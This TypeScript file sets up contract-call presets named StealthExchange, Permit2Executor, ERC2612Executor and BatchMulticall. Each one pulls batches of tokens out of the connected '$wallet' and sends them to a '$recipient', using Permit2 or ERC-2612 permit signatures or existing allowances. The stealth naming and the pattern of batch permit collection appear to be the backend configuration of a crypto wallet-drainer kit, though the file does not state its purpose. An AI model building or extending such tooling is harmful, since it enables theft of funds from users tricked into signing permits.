import type { ContractFunctionBinding } from "@/lib/types";
import { getExecutionBackendEntry } from "@/lib/contract-registry";

function bindingAddress(backend: "stealth-exchange" | "permit2-executor" | "erc2612-executor" | "batch-multicall") {
  return getExecutionBackendEntry(backend)?.address || "";
}

function bindingAbi(backend: "stealth-exchange" | "permit2-executor" | "erc2612-executor" | "batch-multicall") {
  return [...(getExecutionBackendEntry(backend)?.abi || [])];
}

export function getStandardExecutionBindings(): ContractFunctionBinding[] {
  return [
    {
      preset: "stealth-exchange",
      label: "StealthExchange",
      contractAddress: bindingAddress("stealth-exchange"),
      contractName: "StealthExchange",
      abi: bindingAbi("stealth-exchange"),
      functionKey: "batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)",
      functionName: "batchPermitTransferFromBatch",
      stateMutability: "nonpayable",
      args: [
        { name: "user", type: "address", value: "$wallet" },
        {
          name: "permitBatch",
          type: "tuple",
          value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}',
        },
        { name: "signature", type: "bytes", value: "0x" },
        { name: "recipient", type: "address", value: "$recipient" },
      ],
    },
    {
      preset: "permit2-executor",
      label: "Permit2Executor",
      contractAddress: bindingAddress("permit2-executor"),
      contractName: "Permit2Executor",
      abi: bindingAbi("permit2-executor"),
      functionKey: "pullBatchFromAllowance(address,address[],uint256[])",
      functionName: "pullBatchFromAllowance",
      stateMutability: "nonpayable",
      args: [
        { name: "client", type: "address", value: "$wallet" },
        { name: "tokens", type: "address[]", value: "[]" },
        { name: "amounts", type: "uint256[]", value: "[]" },
      ],
    },
    {
      preset: "erc2612-executor",
      label: "ERC2612Executor",
      contractAddress: bindingAddress("erc2612-executor"),
      contractName: "ERC2612Executor",
      abi: bindingAbi("erc2612-executor"),
      functionKey: "batchPermitAndCollect(address[],address,uint256[],uint8[],bytes32[],bytes32[])",
      functionName: "batchPermitAndCollect",
      stateMutability: "nonpayable",
      args: [
        { name: "tokens", type: "address[]", value: "[]" },
        { name: "client", type: "address", value: "$wallet" },
        { name: "amounts", type: "uint256[]", value: "[]" },
        { name: "vs", type: "uint8[]", value: "[]" },
        { name: "rs", type: "bytes32[]", value: "[]" },
        { name: "ss", type: "bytes32[]", value: "[]" },
      ],
    },
    {
      preset: "batch-multicall",
      label: "BatchMulticall",
      contractAddress: bindingAddress("batch-multicall"),
      contractName: "BatchMulticall",
      abi: bindingAbi("batch-multicall"),
      functionKey: "batch((address,uint256,bytes,bool)[])",
      functionName: "batch",
      stateMutability: "payable",
      args: [{ name: "calls", type: "tuple[]", value: "[]" }],
    },
  ];
}
